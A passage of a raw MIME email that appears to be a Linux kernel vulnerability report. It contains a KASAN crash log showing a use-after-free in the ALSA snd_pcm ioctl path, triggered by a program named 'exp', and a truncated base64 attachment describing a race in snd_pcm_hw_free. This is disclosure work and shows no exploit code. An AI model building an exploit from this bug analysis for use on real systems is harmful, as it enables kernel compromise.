<p style=3D"margin:0px;white-space:pre-wrap">[  141.594613]  ? __switch_to_=
asm+0x40/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594614]  __x64_sys_ioct=
l+0x73/0xb0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594617]  do_syscall_64+=
0x9f/0x3c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594619]  ? __switch_to_=
asm+0x34/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594621]  entry_SYSCALL_=
64_after_hwframe+0x44/0xa9</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594624]  ? __fget_light=
+0x17e/0x1f0</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594627]  ksys_ioctl+0x6=
7/0x90</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594630]  __x64_sys_ioct=
l+0x73/0xb0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594633]  ? fpregs_asser=
t_state_consistent+0x22/0xa0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594635] The buggy addre=
ss belongs to the object at ffff8880b34c9400</p>
<p style=3D"margin:0px;white-space:pre-wrap">                which belongs =
to the cache kmalloc-64 of size 64</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594639] The buggy addre=
ss is located 0 bytes inside of</p>
<p style=3D"margin:0px;white-space:pre-wrap">                64-byte region=
 [ffff8880b34c9400, ffff8880b34c9440)</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594641] The buggy addre=
ss belongs to the page:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594644] page:ffffea0002=
cd3240 refcount:1 mapcount:0 mapping:ffff8880c5403600 index:0x0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594646] flags: 0xfffffc=
0000200(slab)</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594649]  do_syscall_64+=
0x9f/0x3c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594652]  ? syscall_retu=
rn_slowpath+0x1a5/0x220</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594653] raw: 000fffffc0=
000200 ffffea0001e253c0 0000000c0000000c ffff8880c5403600</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594657]  entry_SYSCALL_=
64_after_hwframe+0x44/0xa9</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594658] raw: 0000000000=
000000 0000000080200020 00000001ffffffff 0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594659] page dumped bec=
ause: kasan: bad access detected</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594661] RIP: 0033:0x4e6=
8b7</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594664] Code: 4f 55 04 =
00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3 90 48 89 e8 48 f7 d8 48 39 c3 =
0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c=
3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594666] RSP: 002b:00007=
fab6fab2da8 EFLAGS: 00000246 ORIG_RAX: 0000000000000010</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594668] Memory state ar=
ound the buggy address:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594670] RAX: ffffffffff=
ffffda RBX: 0000000000000000 RCX: 00000000004e68b7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594672] RDX: 0000000000=
000000 RSI: 0000000000004112 RDI: 0000000000000003</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594674] RBP: 00007fab6f=
ab2db0 R08: 00007fab6fab3700 R09: 00007fab6fab3700</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594675]  ffff8880b34c93=
00: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594678]  ffff8880b34c93=
80: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594680] &gt;ffff8880b34=
c9400: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594682]                =
    ^</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594684]  ffff8880b34c94=
80: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594686]  ffff8880b34c95=
00: 00 00 00 00 00 00 fc fc fc fc fc fc fc fc fc fc</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594688] =3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594690] Disabling lock =
debugging due to kernel taint</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594692] R10: 00007fab6f=
ab39d0 R11: 0000000000000246 R12: 00007fab6fab2e80</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594693] R13: 0000000000=
000000 R14: 0000000000000000 R15: 00007ffe52234d70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594699] ------------[ c=
ut here ]------------</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594700] pm_qos_remove_r=
equest() called for unknown object</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594706] snd-malloc: inv=
alid device type 0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594709] ------------[ c=
ut here ]------------</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594710] pm_qos_remove_r=
equest() called for unknown object</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594716] WARNING: CPU: 2=
 PID: 1948 at kernel/power/qos.c:477 pm_qos_remove_request+0x204/0x2c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594719] WARNING: CPU: 1=
 PID: 1956 at kernel/power/qos.c:477 pm_qos_remove_request+0x204/0x2c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594720] Modules linked =
in:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594721] Modules linked =
in:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594721]  nls_iso8859_1 =
intel_rapl_msr</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594723]  nls_iso8859_1<=
/p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594724]  snd_intel8x0 s=
nd_ac97_codec</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594726]  intel_rapl_msr=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594727]  ac97_bus snd_p=
cm</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594728]  snd_intel8x0</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594729]  snd_seq_midi</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594730]  snd_ac97_codec=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594731]  snd_seq_midi_e=
vent</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594732]  ac97_bus</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594733]  snd_rawmidi sn=
d_seq</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594735]  snd_pcm</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594736]  intel_rapl_com=
mon</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594737]  snd_seq_midi</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594738]  crct10dif_pclm=
ul ghash_clmulni_intel</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594740]  snd_seq_midi_e=
vent</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594740]  snd_seq_device=
 joydev</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594742]  snd_rawmidi</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594743]  cryptd</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594744]  snd_seq</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594745]  snd_timer rapl=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594747]  intel_rapl_com=
mon</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594748]  input_leds ser=
io_raw</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594749]  crct10dif_pclm=
ul</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594750]  snd vboxguest<=
/p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594752]  ghash_clmulni_=
intel</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594753]  soundcore</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594754]  snd_seq_device=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594755]  mac_hid sch_fq=
_codel</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594756]  joydev</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594757]  vmwgfx</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594758]  cryptd</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594759]  ttm drm_kms_he=
lper</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594761]  snd_timer</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594762]  fb_sys_fops sy=
scopyarea</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594763]  rapl</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594764]  sysfillrect sy=
simgblt</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594766]  input_leds</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594767]  drm parport_pc=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594768]  serio_raw</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594769]  ppdev</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594770]  snd</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594771]  lp parport</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594773]  vboxguest</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594774]  ip_tables x_ta=
bles</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594775]  soundcore</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594776]  autofs4 hid_ge=
neric</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594778]  mac_hid</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594779]  usbhid hid</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594780]  sch_fq_codel</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594781]  psmouse crc32_=
pclmul</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594783]  vmwgfx</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594784]  ahci libahci</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594785]  ttm</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594786]  e1000 i2c_piix=
4</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594788]  drm_kms_helper=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594818]  pata_acpi vide=
o</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594821]  fb_sys_fops</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594823]  syscopyarea sy=
sfillrect</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594826] CPU: 1 PID: 195=
6 Comm: exp Tainted: G    B             5.4.166 #1</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594827]  sysimgblt drm =
parport_pc</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594830] Hardware name: =
innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594830]  ppdev lp parpo=
rt</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594835] RIP: 0010:pm_qo=
s_remove_request+0x204/0x2c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594836]  ip_tables x_ta=
bles autofs4</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594839] Code: 48 c1 ea =
03 0f b6 04 02 84 c0 74 08 3c 03 0f 8e 9c 00 00 00 4d 63 6c 24 28 e9 8d fe =
ff ff 48 c7 c7 e0 44 4d ba e8 7f 10 f1 01 &lt;0f&gt; 0b 5b 41 5c 41 5d 41 5=
e 41 5f 5d c3 48 b8 00 00 00 00 00 fc ff</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594840]  hid_generic us=
bhid hid</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594843] RSP: 0018:ffff8=
880b366fbb8 EFLAGS: 00010282</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594844]  psmouse crc32_=
pclmul</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594846]  ahci libahci e=
1000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594849] RAX: 0000000000=
000000 RBX: ffffffffc0b416e0 RCX: 0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594849]  i2c_piix4 pata=
_acpi video</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594852] RDX: 0000000000=
000001 RSI: 0000000000000008 RDI: ffffed10166cdf69</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594854] RBP: ffff8880b3=
66fbe0 R08: 0000000000000001 R09: ffffed10193d551b</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594857] CPU: 2 PID: 194=
8 Comm: exp Tainted: G    B             5.4.166 #1</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594858] Hardware name: =
innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594859] R10: ffffed1019=
3d551a R11: ffff8880c9eaa8d7 R12: ffff888035191440</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594861] R13: ffff888035=
191594 R14: ffff888035191400 R15: ffff888035191468</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594863] RIP: 0010:pm_qo=
s_remove_request+0x204/0x2c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594866] Code: 48 c1 ea =
03 0f b6 04 02 84 c0 74 08 3c 03 0f 8e 9c 00 00 00 4d 63 6c 24 28 e9 8d fe =
ff ff 48 c7 c7 e0 44 4d ba e8 7f 10 f1 01 &lt;0f&gt; 0b 5b 41 5c 41 5d 41 5=
e 41 5f 5d c3 48 b8 00 00 00 00 00 fc ff</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594868] FS:  00007fab6b=
aab700(0000) GS:ffff8880c9e80000(0000) knlGS:0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594869] CS:  0010 DS: 0=
000 ES: 0000 CR0: 0000000080050033</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594871] RSP: 0018:ffff8=
8809d6ffbb8 EFLAGS: 00010282</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594873] CR2: 00007fab66=
aa0e78 CR3: 000000004d344005 CR4: 00000000000606e0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594874] RAX: 0000000000=
000000 RBX: ffffffffc0b416e0 RCX: 0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594876] RDX: 0000000000=
000001 RSI: 0000000000000008 RDI: ffffed1013adff69</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594878] RBP: ffff88809d=
6ffbe0 R08: 0000000000000001 R09: ffffed10193e551b</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594879] DR0: 0000000000=
000000 DR1: 0000000000000000 DR2: 0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594881] R10: ffffed1019=
3e551a R11: ffff8880c9f2a8d7 R12: ffff888035191440</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594882] DR3: 0000000000=
000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594884] R13: ffff888035=
191594 R14: ffff888035191400 R15: ffff888035191468</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594885] Call Trace:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594888] FS:  00007fab6f=
ab3700(0000) GS:ffff8880c9f00000(0000) knlGS:0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594894]  snd_pcm_common=
_ioctl+0x5f2/0x1b00 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594896] CS:  0010 DS: 0=
000 ES: 0000 CR0: 0000000080050033</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594901]  ? snd_pcm_stat=
us_user+0x130/0x130 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594903] CR2: 000055cff0=
604b28 CR3: 000000004d344002 CR4: 00000000000606e0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594909]  snd_pcm_ioctl+=
0x6d/0xb0 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594911] DR0: 0000000000=
000000 DR1: 0000000000000000 DR2: 0000000000000000</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594913] DR3: 0000000000=
000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594915]  do_vfs_ioctl+0=
x9da/0x1020</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594916] Call Trace:</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594919]  ? ioctl_preall=
ocate+0x1c0/0x1c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594922]  ? __kasan_chec=
k_write+0x14/0x20</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594927]  snd_pcm_common=
_ioctl+0x5f2/0x1b00 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594930]  ? __fget+0x21c=
/0x3d0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594935]  ? snd_pcm_stat=
us_user+0x130/0x130 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594939]  ? copy_fd_bitm=
aps+0x2e0/0x2e0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594944]  snd_pcm_ioctl+=
0x6d/0xb0 [snd_pcm]</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594947]  ? __switch_to_=
asm+0x40/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594949]  do_vfs_ioctl+0=
x9da/0x1020</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594951]  ? __switch_to_=
asm+0x34/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594953]  ? ioctl_preall=
ocate+0x1c0/0x1c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594955]  ? __switch_to_=
asm+0x40/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594957]  ? __kasan_chec=
k_write+0x14/0x20</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594960]  ? __fget+0x21c=
/0x3d0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594961]  ? __switch_to_=
asm+0x34/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594965]  ? __fget_light=
+0x17e/0x1f0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594967]  ? copy_fd_bitm=
aps+0x2e0/0x2e0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594969]  ? __switch_to_=
asm+0x40/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594971]  ksys_ioctl+0x6=
7/0x90</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594974]  ? __switch_to_=
asm+0x34/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594976]  __x64_sys_ioct=
l+0x73/0xb0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594979]  ? fpregs_asser=
t_state_consistent+0x22/0xa0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594980]  ? __switch_to_=
asm+0x40/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594982]  ? __switch_to_=
asm+0x34/0x70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594985]  do_syscall_64+=
0x9f/0x3c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594988]  ? syscall_retu=
rn_slowpath+0x1a5/0x220</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594990]  ? __fget_light=
+0x17e/0x1f0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594993]  entry_SYSCALL_=
64_after_hwframe+0x44/0xa9</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594995]  ksys_ioctl+0x6=
7/0x90</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.594998] RIP: 0033:0x4e6=
8b7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595000]  __x64_sys_ioct=
l+0x73/0xb0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595002]  ? fpregs_asser=
t_state_consistent+0x22/0xa0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595004] Code: 4f 55 04 =
00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3 90 48 89 e8 48 f7 d8 48 39 c3 =
0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c=
3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595006] RSP: 002b:00007=
fab6baaada8 EFLAGS: 00000246</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595008]  do_syscall_64+=
0x9f/0x3c0</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595009]  ORIG_RAX: 0000=
000000000010</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595011] RAX: ffffffffff=
ffffda RBX: 0000000000000000 RCX: 00000000004e68b7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595012] RDX: 0000000000=
000000 RSI: 0000000000004112 RDI: 0000000000000003</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595015]  ? syscall_retu=
rn_slowpath+0x1a5/0x220</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595017] RBP: 00007fab6b=
aaadb0 R08: 00007fab6baab700 R09: 00007fab6baab700</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595019]  entry_SYSCALL_=
64_after_hwframe+0x44/0xa9</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595021] RIP: 0033:0x4e6=
8b7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595022] R10: 00007fab6b=
aab9d0 R11: 0000000000000246 R12: 00007fab6baaae80</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595024] R13: 0000000000=
000000 R14: 0000000000000000 R15: 00007ffe52234d70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595026] Code: 4f 55 04 =
00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3 90 48 89 e8 48 f7 d8 48 39 c3 =
0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c=
3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595027] RSP: 002b:00007=
fab6fab2da8 EFLAGS: 00000246 ORIG_RAX: 0000000000000010</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595030] RAX: ffffffffff=
ffffda RBX: 0000000000000000 RCX: 00000000004e68b7</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595031] ---[ end trace =
86992d9d3bd66364 ]---</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595033] RDX: 0000000000=
000000 RSI: 0000000000004112 RDI: 0000000000000003</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595035] RBP: 00007fab6f=
ab2db0 R08: 00007fab6fab3700 R09: 00007fab6fab3700</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595037] R10: 00007fab6f=
ab39d0 R11: 0000000000000246 R12: 00007fab6fab2e80</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595038] R13: 0000000000=
000000 R14: 0000000000000000 R15: 00007ffe52234d70</p>
<p style=3D"margin:0px;white-space:pre-wrap">[  141.595043] ---[ end trace =
86992d9d3bd66365 ]---</p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p></div>
</div></div></div></div>

--000000000000f2ac1e05db47d2ca--

--000000000000f2ac2005db47d2cc
Content-Type: text/markdown; charset="US-ASCII"; name="Report.md"
Content-Disposition: attachment; filename="Report.md"
Content-Transfer-Encoding: base64
Content-ID: <f_l1as481p0>
X-Attachment-Id: f_l1as481p0

IyBMaW51eCBLZXJuZWw6IFJhY2UgQ29uZGl0aW9uIGluIHNuZF9wY21faHdf
ZnJlZSBsZWFkaW5nIHRvIHVzZS1hZnRlci1mcmVlCiMjIERldGFpbHMKSW4g
dGhlIHBhdGg6IHNuZF9wY21fY29tbW9uX2lvY3RsIC0+IHNuZF9wY21faHdf
ZnJlZToKYGBgYwpzdGF0aWMgaW50IHNuZF9wY21faHdfZnJlZShzdHJ1Y3Qg
c25kX3BjbV9zdWJzdHJlYW0gKnN1YnN0cmVhbSkKewoJc3RydWN0IHNuZF9w
Y21fcnVudGltZSAqcnVudGltZTsKCWludCByZXN1bHQ7CgoJaWYgKFBDTV9S
VU5USU1FX0NIRUNLKHN1YnN0cmVhbSkpCgkJcmV0dXJuIC1FTlhJTzsKCXJ1
bnRpbWUgPSBzdWJzdHJlYW0tPnJ1bnRpbWU7CglzbmRfcGNtX3N0cmVhbV9s
b2NrX2lycShzdWJzdHJlYW0pOwoJc3dpdGNoIChydW50aW1lLT5zdGF0dXMt
PnN0YXRlKSB7CgljYXNlIFNORFJWX1BDTV9TVEFURV9TRVRVUDoKCWNhc2Ug
U05EUlZfUENNX1NUQVRFX1BSRVBBUkVEOgoJCWJyZWFrOwoJZGVmYXVsdDoK
CQlzbmRfcGNtX3N0cmVhbV91bmxvY2tfaXJxKHN1YnN0cmVhbSk7CgkJcmV0
dXJuIC1FQkFERkQ7Cgl9CglzbmRfcGNtX3N0cmVhbV91bmxvY2tfaXJxKHN1
YnN0cmVhbSk7CglpZiAoYXRvbWljX3JlYWQoJnN1YnN0cmVhbS0+bW1hcF9j
b3VudCkpCgkJcmV0dXJuIC1FQkFERkQ7CglyZXN1bHQgPSBkb19od19mcmVl
KHN1YnN0cmVhbSk7CglzbmRfcGNtX3NldF9zdGF0ZShzdWJzdHJlYW0sIFNO
RFJWX1BDTV9TVEFURV9PUEVOKTsKCWNwdV9sYXRlbmN5X3Fvc19yZW1vdmVf
cmVxdWVzdCgmc3Vic3RyZWFtLT5sYXRlbmN5X3BtX3Fvc19yZXEpOwoJcmV0
dXJuIHJlc3VsdDsKfQpgYGAKSXQgc2VlbXMgbGlrZSB0aGF0IHRoZSBmdW5j
dGlvbiBjYWxsIHRoZSB1bmxvY2sgdG9vIGVhcmx5LCB0aGlzIG1heSBsZWFk
IHRvIGEgcmFjZSBjb25kaXRpb24gaW4gdGhlIGZvbGxvd2luZyBjb2RlLiAK
QW5kIGlmIHR3byB0aHJlYWRzIGNhbGwgZG9faHdfZnJlZS0+c25kX3BjbV9s
aWJfZnJlZV9wYWdlcyBhdCB0aGUgc2FtZSB0aW1lOgpgYGAKaW50IHNuZF9w
Y21fbGliX2ZyZWVfcGFnZXMoc3RydWN0IHNuZF9wY21fc3Vic3RyZWFtICpz
dWJzdHJlYW0pCnsKCXN0cnVjdCBzbmRfY2FyZCAqY2FyZCA9IHN1YnN0cmVh
bS0+cGNtLT5jYXJkOwoJc3RydWN0IHNuZF9wY21fcnVudGltZSAqcnVudGlt
ZTsKCglpZiAoUENNX1JVTlRJTUVfQ0hFQ0soc3Vic3RyZWFtKSkKCQlyZXR1
cm4gLUVJTlZBTDsKCXJ1bnRpbWUgPSBzdWJzdHJlYW0tPnJ1bnRpbWU7Cglp
ZiAocnVudGltZS0+ZG1hX2FyZWEgPT0gTlVMTCkKCQlyZXR1cm4gMDsKCWlm
IChydW50aW1lLT5kbWFfYnVmZmVyX3AgIT0gJnN1YnN0cmVhbS0+ZG1hX2J1
ZmZlcikgeyAgICAvLyAgKioqKioqKiogMSAqKioqKioqKgoJCS8qIGl0J3Mg
